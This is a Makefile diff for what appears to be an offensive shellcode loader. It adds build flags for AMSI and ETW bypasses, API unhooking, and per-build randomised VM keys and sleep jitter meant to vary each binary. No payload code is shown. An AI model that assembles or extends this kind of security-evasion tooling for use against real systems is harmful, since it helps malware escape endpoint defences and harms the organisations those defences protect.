@@ -71,12 +71,55 @@ ARCH           ?= x64
 INJECTION_TYPE ?= 2
 CONFIG_SYSCALL_BACKEND        ?= 0
 CONFIG_SLEEP_OBFUSCATION_TYPE ?= 0
+CONFIG_AMSI_BYPASS_TYPE       ?= 1
+CONFIG_ETW_BYPASS_TYPE        ?= 0
+CONFIG_UNHOOK_SCOPE           ?= 0
+
+# [MALLEABLE] Per-build randomisation parameters.
+# builder.py generates fresh values on every build and passes them here.
+# Defaults below produce a functional but non-randomised loader.
+VM_IR_SEED         ?= 0xC0DE1337U
+VM_FWD_0           ?= 7
+VM_FWD_1           ?= 5
+VM_FWD_2           ?= 3
+VM_FWD_3           ?= 1
+VM_FWD_4           ?= 6
+VM_FWD_5           ?= 0
+VM_FWD_6           ?= 2
+VM_FWD_7           ?= 4
+VM_KEY_BASE_0      ?= 0x65
+VM_KEY_BASE_1      ?= 0x72
+VM_KEY_BASE_2      ?= 0x65
+VM_KEY_BASE_3      ?= 0x62
+VM_KEY_BASE_4      ?= 0x75
+VM_KEY_BASE_5      ?= 0x73
+VM_SLEEP_BASE_MS   ?= 5000
+VM_SLEEP_JITTER_MS ?= 3000
 
 LOADER_ROOT := ../Erebus.Loader
 
 # ---------------------------------------------------------------------------
 # Loader CFLAGS
 # ---------------------------------------------------------------------------
+
+VM_RANDOM_DEFS := \
+    -DVM_IR_SEED=$(VM_IR_SEED) \
+    -DVM_FWD_0=$(VM_FWD_0) \
+    -DVM_FWD_1=$(VM_FWD_1) \
+    -DVM_FWD_2=$(VM_FWD_2) \
+    -DVM_FWD_3=$(VM_FWD_3) \
+    -DVM_FWD_4=$(VM_FWD_4) \
+    -DVM_FWD_5=$(VM_FWD_5) \
+    -DVM_FWD_6=$(VM_FWD_6) \
+    -DVM_FWD_7=$(VM_FWD_7) \
+    -DVM_KEY_BASE_0=$(VM_KEY_BASE_0) \
+    -DVM_KEY_BASE_1=$(VM_KEY_BASE_1) \
+    -DVM_KEY_BASE_2=$(VM_KEY_BASE_2) \
+    -DVM_KEY_BASE_3=$(VM_KEY_BASE_3) \
+    -DVM_KEY_BASE_4=$(VM_KEY_BASE_4) \
+    -DVM_KEY_BASE_5=$(VM_KEY_BASE_5) \
+    -DVM_SLEEP_BASE_MS=$(VM_SLEEP_BASE_MS) \
+    -DVM_SLEEP_JITTER_MS=$(VM_SLEEP_JITTER_MS)
 
 COMMON_FLAGS := -std=c++20 -Wall \
                 -I"$(CURDIR)/include" \
@@ -95,6 +138,10 @@ COMMON_FLAGS := -std=c++20 -Wall \
                 -DCONFIG_ENCRYPTION_TYPE=0 \
                 -DCONFIG_SYSCALL_BACKEND=$(CONFIG_SYSCALL_BACKEND) \
                 -DCONFIG_SLEEP_OBFUSCATION_TYPE=$(CONFIG_SLEEP_OBFUSCATION_TYPE) \
+                -DCONFIG_AMSI_BYPASS_TYPE=$(CONFIG_AMSI_BYPASS_TYPE) \
+                -DCONFIG_ETW_BYPASS_TYPE=$(CONFIG_ETW_BYPASS_TYPE) \
+                -DCONFIG_UNHOOK_SCOPE=$(CONFIG_UNHOOK_SCOPE) \
+                $(VM_RANDOM_DEFS) \
                 $(if $(EREBUS_HASH_SEED),-DEREBUS_HASH_SEED=$(EREBUS_HASH_SEED),)
 
 ifeq ($(ARCH),x64)
@@ -240,7 +287,8 @@ $(OUT): $(LOADER_OBJS)
 
 BUILDER_CFLAGS := -std=c++20 -O2 \
     -I"$(CURDIR)/include" \
-    -I"$(LOADER_ROOT)/include"
+    -I"$(LOADER_ROOT)/include" \
+    $(VM_RANDOM_DEFS)
 
 BUILDER_SRC := builder/vmloader_builder.cpp
 BUILDER_BIN := builder/vmloader_builder$(if $(filter Windows,$(DETECTED_OS)),.exe,)
